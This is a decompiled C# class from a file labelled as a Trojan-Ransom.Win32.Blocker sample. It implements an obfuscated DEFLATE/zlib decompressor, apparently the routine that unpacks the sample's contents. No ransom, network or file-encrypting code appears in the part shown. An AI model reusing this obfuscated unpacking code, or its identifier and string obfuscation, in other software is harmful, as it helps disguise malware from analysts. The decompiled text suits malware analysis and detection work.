// Decompiled with JetBrains decompiler
// Type: .
// Assembly: 1m, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 9A9758D8-D673-4760-AFDD-69A3D20C59FF
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.krdt-d2cd288694c5883ae6364f17a60ae3fe9619748d94946bbd3e1ff8ba566b1e0f.exe

using \u0001;
using \u0006;
using \u000E;
using \u0010;
using \u0020;
using System;
using System.Runtime.CompilerServices;

namespace \u0010
{
  internal class \u0003
  {
    private const int \u0001 = 0;
    private const int \u0001 = 1;
    private const int \u0002 = 2;
    private const int \u0003 = 3;
    private const int \u0004 = 4;
    private const int \u0005 = 5;
    private const int \u0006 = 6;
    private const int \u0007 = 7;
    private const int \u0008 = 8;
    private const int \u0002 = 9;
    private const int \u0003 = 10;
    private const int \u0004 = 11;
    private const int \u0005 = 12;
    private static int[] \u0001;
    private static int[] \u0001;
    private static int[] \u0002;
    private static int[] \u0003;
    private int \u0006;
    private int \u0007;
    private int \u0008;
    private int \u000E;
    private int \u000F;
    private int \u0010;
    private bool \u0001;
    private int \u0011;
    private int \u0012;
    private bool \u0001;
    private \u0002 \u0001;
    private \u0002 \u0001;
    private \u0005.\u0001 \u0001;
    private \u000B \u0001;
    private \u000B \u0001;
    private \u0010.\u0001 \u0001;
    [NonSerialized]
    internal static \u0013 \u0012;

    public \u0003()
      : this(false)
    {
    }

    public \u0003(bool _param1)
    {
      this.\u0001 = _param1;
      this.\u0001 = new \u0010.\u0001();
      this.\u0001 = new \u0002();
      this.\u0001 = new \u0002();
      this.\u0006 = _param1 ? 2 : 0;
    }

    static \u0003()
    {
      \u0003.\u0001(typeof (\u0003));
      \u0003.\u0001 = new int[29]
      {
        3,
        4,
        5,
        6,
        7,
        8,
        9,
        10,
        11,
        13,
        15,
        17,
        19,
        23,
        27,
        31,
        35,
        43,
        51,
        59,
        67,
        83,
        99,
        115,
        131,
        163,
        195,
        227,
        258
      };
      \u0003.\u0001 = new int[29]
      {
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        1,
        1,
        1,
        1,
        2,
        2,
        2,
        2,
        3,
        3,
        3,
        3,
        4,
        4,
        4,
        4,
        5,
        5,
        5,
        5,
        0
      };
      \u0003.\u0002 = new int[30]
      {
        1,
        2,
        3,
        4,
        5,
        7,
        9,
        13,
        17,
        25,
        33,
        49,
        65,
        97,
        129,
        193,
        257,
        385,
        513,
        769,
        1025,
        1537,
        2049,
        3073,
        4097,
        6145,
        8193,
        12289,
        16385,
        24577
      };
      \u0003.\u0003 = new int[30]
      {
        0,
        0,
        0,
        0,
        1,
        1,
        2,
        2,
        3,
        3,
        4,
        4,
        5,
        5,
        6,
        6,
        7,
        7,
        8,
        8,
        9,
        9,
        10,
        10,
        11,
        11,
        12,
        12,
        13,
        13
      };
    }

    public void \u0001()
    {
      this.\u0006 = this.\u0001 ? 2 : 0;
      this.\u0012 = this.\u0011 = 0;
      this.\u0001.\u0004();
      this.\u0001.\u0002();
      this.\u0001 = (\u0005.\u0001) null;
      this.\u0001 = (\u000B) null;
      this.\u0001 = (\u000B) null;
      this.\u0001 = false;
      this.\u0001.\u0001();
    }

    private bool \u0001()
    {
      int num1 = this.\u0001.\u0001(16);
      if (num1 < 0)
        return false;
      this.\u0001.\u0001(16);
      int num2 = (num1 << 8 | num1 >> 8) & (int) ushort.MaxValue;
      if (num2 % 31 != 0)
        throw new FormatException(\u0001.\u0005.\u0020(957957996, 1928468460, 89796883));
      if ((num2 & 3840) != \u0006.\u0001.\u0004 << 8)
        throw new FormatException(\u0001.\u0005.\u0020(2143859999, 1928468440, 89796873));
      if ((num2 & 32) == 0)
      {
        this.\u0006 = 2;
      }
      else
      {
        this.\u0006 = 1;
        this.\u0008 = 32;
      }
      return true;
    }

    private bool \u0002()
    {
      for (; this.\u0008 > 0; this.\u0008 -= 8)
      {
        int num = this.\u0001.\u0001(8);
        if (num < 0)
          return false;
        this.\u0001.\u0001(8);
        this.\u0007 = this.\u0007 << 8 | num;
      }
      return false;
    }

    private bool \u0003()
    {
      int num1 = this.\u0001.\u0001();
      while (num1 >= 258)
      {
        switch (this.\u0006)
        {
          case 7:
            int num2;
            while (((num2 = this.\u0001.\u0001(this.\u0001)) & -256) == 0)
            {
              this.\u0001.\u0001(num2);
              if (--num1 < 258)
                return true;
            }
            if (num2 < 257)
            {
              if (num2 < 0)
                return false;
              this.\u0001 = (\u000B) null;
              this.\u0001 = (\u000B) null;
              this.\u0006 = 2;
              return true;
            }
            try
            {
              this.\u000E = \u0003.\u0001[num2 - 257];
              this.\u0008 = \u0003.\u0001[num2 - 257];
              goto case 8;
            }
            catch (Exception ex)
            {
              throw new FormatException(\u0001.\u0005.\u0020(1608128964, 1928468308, 89796883));
            }
          case 8:
            if (this.\u0008 > 0)
            {
              this.\u0006 = 8;
              int num3 = this.\u0001.\u0001(this.\u0008);
              if (num3 < 0)
                return false;
              this.\u0001.\u0001(this.\u0008);
              this.\u000E += num3;
            }
            this.\u0006 = 9;
            goto case 9;
          case 9:
            int index = this.\u0001.\u0001(this.\u0001);
            if (index < 0)
              return false;
            try
            {
              this.\u000F = \u0003.\u0002[index];
              this.\u0008 = \u0003.\u0003[index];
              goto case 10;
            }
            catch (Exception ex)
            {
              throw new FormatException(\u0001.\u0005.\u0020(488977615, 1928468410, 89796887));
            }
          case 10:
            if (this.\u0008 > 0)
            {
              this.\u0006 = 10;
              int num4 = this.\u0001.\u0001(this.\u0008);
              if (num4 < 0)
                return false;
              this.\u0001.\u0001(this.\u0008);
              this.\u000F += num4;
            }
            this.\u0001.\u0001(this.\u000E, this.\u000F);
            num1 -= this.\u000E;
            this.\u0006 = 7;
            continue;
          default:
            throw new FormatException();
        }
      }
      return true;
    }

    private bool \u0004()
    {
      for (; this.\u0008 > 0; this.\u0008 -= 8)
      {
        int num = this.\u0001.\u0001(8);
        if (num < 0)
          return false;
        this.\u0001.\u0001(8);
        this.\u0007 = this.\u0007 << 8 | num;
      }
      if ((int) this.\u0001.\u0001() != this.\u0007)
        throw new FormatException(\u0001.\u0005.\u0020(1109758776, 1928468252, 89796869) + (object) (int) this.\u0001.\u0001() + \u0001.\u0005.\u0020(1470542969, 1928468322, 89796919) + (object) this.\u0007);
      this.\u0006 = 12;
      return false;
    }

    private bool \u0005()
    {
      switch (this.\u0006)
      {
        case 0:
          return this.\u0001();
        case 1:
          return this.\u0002();
        case 2:
          if (this.\u0001)
          {
            if (this.\u0001)
            {
              this.\u0006 = 12;
              return false;
            }
            this.\u0001.\u0002();
            this.\u0008 = 32;
            this.\u0006 = 11;
            return true;
          }
          int num1 = this.\u0001.\u0001(3);
          if (num1 < 0)
            return false;
          this.\u0001.\u0001(3);
          if ((num1 & 1) != 0)
            this.\u0001 = true;
          switch (num1 >> 1)
          {
            case 0:
              this.\u0001.\u0002();
              this.\u0006 = 3;
              break;
            case 1:
              this.\u0001 = \u000B.\u0001;
              this.\u0001 = \u000B.\u0001;
              this.\u0006 = 7;
              break;
            case 2:
              this.\u0001 = new \u0005.\u0001();
              this.\u0006 = 6;
              break;
            default:
              throw new FormatException(\u0001.\u0005.\u0020(1198610634, 1928468214, 89796891) + (object) num1);
          }
          return true;
        case 3:
          if ((this.\u0010 = this.\u0001.\u0001(16)) < 0)
            return false;
          this.\u0001.\u0001(16);
          this.\u0006 = 4;
          goto case 4;
        case 4:
          int num2 = this.\u0001.\u0001(16);
          if (num2 < 0)
            return false;
          this.\u0001.\u0001(16);
          if (num2 != (this.\u0010 ^ (int) ushort.MaxValue))
            throw new FormatException(\u0001.\u0005.\u0020(867997249, 1928468260, 89796879));
          this.\u0006 = 5;
          goto case 5;
        case 5:
          this.\u0010 -= this.\u0001.\u0001(this.\u0001, this.\u0010);
          if (this.\u0010 != 0)
            return !this.\u0001.\u0003();
          this.\u0006 = 2;
          return true;
        case 6:
          if (!this.\u0001.\u0001(this.\u0001))
            return false;
          this.\u0001 = this.\u0001.\u0001();
          this.\u0001 = this.\u0001.\u0001();
          this.\u0006 = 7;
          goto case 7;
        case 7:
        case 8:
        case 9:
        case 10:
          return this.\u0003();
        case 11:
          return this.\u0004();
        case 12:
          return false;
        default:
          throw new FormatException();
      }
    }

    public void \u0001(byte[] _param1) => this.\u0001(_param1, 0, _param1.Length);

    public void \u0001(byte[] _param1, int _param2, int _param3)
    {
      if (!this.\u0007())
        throw new InvalidOperationException();
      this.\u0001.\u0001(_param1, _param2, _param3);
      if ((int) this.\u0001.\u0001() != this.\u0007)
        throw new ArgumentException(\u0001.\u0005.\u0020(360619905, 1928468108, 89796885));
      this.\u0001.\u0001();
      this.\u0001.\u0001(_param1, _param2, _param3);
      this.\u0006 = 2;
    }

    public void \u0001(byte[] _param1) => this.\u0001(_param1, 0, _param1.Length);

    public void \u0001(byte[] _param1, int _param2, int _param3)
    {
      this.\u0001.\u0001(_param1, _param2, _param3);
      this.\u0012 += _param3;
    }

    public int \u0002(byte[] _param1) => this.\u0002(_param1, 0, _param1.Length);

    public int \u0002(byte[] _param1, int _param2, int _param3)
    {
      if (_param3 < 0)
        throw new ArgumentOutOfRangeException(\u0001.\u0005.\u0020(1341716017, 1928468132, 89796915));
      if (_param3 == 0)
        return 0;
      int num1 = 0;
      do
      {
        if (this.\u0006 != 11)
        {
          int num2 = this.\u0001.\u0001(_param1, _param2, _param3);
          this.\u0001.\u0001(_param1, _param2, num2);
          _param2 += num2;
          num1 += num2;
          this.\u0011 += num2;
          _param3 -= num2;
          if (_param3 == 0)
            return num1;
        }
      }
      while (this.\u0005() || this.\u0001.\u0001() > 0 && this.\u0006 != 11);
      return num1;
    }

    [SpecialName]
    public bool \u0006() => this.\u0001.\u0003();

    [SpecialName]
    public bool \u0007() => this.\u0006 == 1 && this.\u0008 == 0;

    [SpecialName]
    public bool \u0008() => this.\u0006 == 12 && this.\u0001.\u0001() == 0;

    [SpecialName]
    public int \u0001() => !this.\u0007() ? (int) this.\u0001.\u0001() : this.\u0007;

    [SpecialName]
    public int \u0002() => this.\u0011;

    [SpecialName]
    public int \u0003() => this.\u0012 - this.\u0004();

    [SpecialName]
    public int \u0004() => this.\u0001.\u0001();
  }
}
